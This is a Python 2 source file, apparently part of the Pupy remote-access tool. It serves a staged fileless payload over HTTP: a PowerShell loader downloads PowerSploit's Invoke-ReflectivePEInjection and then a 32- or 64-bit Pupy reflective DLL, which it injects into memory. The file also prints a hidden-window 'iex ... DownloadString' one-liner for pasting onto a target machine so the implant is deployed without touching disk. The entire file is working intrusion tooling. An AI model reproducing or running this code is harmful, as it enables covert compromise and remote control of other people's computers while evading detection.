#!/usr/bin/env python
# -*- coding: UTF8 -*-
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import os.path
from pupylib.utils.term import colorize
import textwrap
from pupygen import get_edit_pupyx86_dll, get_edit_pupyx64_dll 

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path=="/p":
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            pe_bootloader=(textwrap.dedent("""
            iex (New-Object System.Net.WebClient).DownloadString("http://%s:%s/rpi")
            $path="b64"
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8){$path="b32"}
            [Byte[]]$b=(New-Object System.Net.WebClient).DownloadData("http://%s:%s/"+$path)

            Invoke-ReflectivePEInjection -PEBytes $b
            """%(self.server.link_ip, self.server.link_port, self.server.link_ip, self.server.link_port)))
            self.wfile.write(pe_bootloader)
            print colorize("[+] ","green")+" powershell script stage1 served !"

        elif self.path=="/rpi":
            #serve the powershell script
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            self.wfile.write(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")).read())
            print colorize("[+] ","green")+" powershell Invoke-ReflectivePEInjection.ps1 script served !"
        elif self.path=="/b32":
            #serve the pupy 32bits dll to load from memory
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            print colorize("[+] ","green")+" generating x86 reflective dll ..."
            self.wfile.write(get_edit_pupyx86_dll(self.server.payload_conf))
            print colorize("[+] ","green")+" pupy x86 reflective dll served !"
        elif self.path=="/b64":
            #serve the pupy 64bits dll to load from memory
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            print colorize("[+] ","green")+" generating amd64 reflective dll ..."
            self.wfile.write(get_edit_pupyx64_dll(self.server.payload_conf))
            print colorize("[+] ","green")+" pupy amd64 reflective dll served !"
        else:
            self.send_response(404)
            self.end_headers()
            return

class ps1_HTTPServer(HTTPServer):
    def __init__(self, server_address, conf, link_ip, link_port):
        self.payload_conf = conf
        self.link_ip=link_ip
        self.link_port=link_port
        HTTPServer.__init__(self, server_address, PupyPayloadHTTPHandler)

def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
    try:
        while True:
            try:
                server = ps1_HTTPServer((ip, port), conf, link_ip, port)
                break
            except Exception as e:
                # [Errno 98] Adress already in use
                if e[0] == 98:
                    port+=1
                else:
                    raise
        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
        print " --- "
        oneliner=colorize("powershell.exe -w hidden -c \"iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/p')\""%(link_ip, port), "green")
        print oneliner
        print " --- "

        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
        print colorize("[+] ","green")+'waiting for a connection ...'
        server.serve_forever()
    except KeyboardInterrupt:
        print 'KeyboardInterrupt received, shutting down the web server'
        server.socket.close()
        exit()


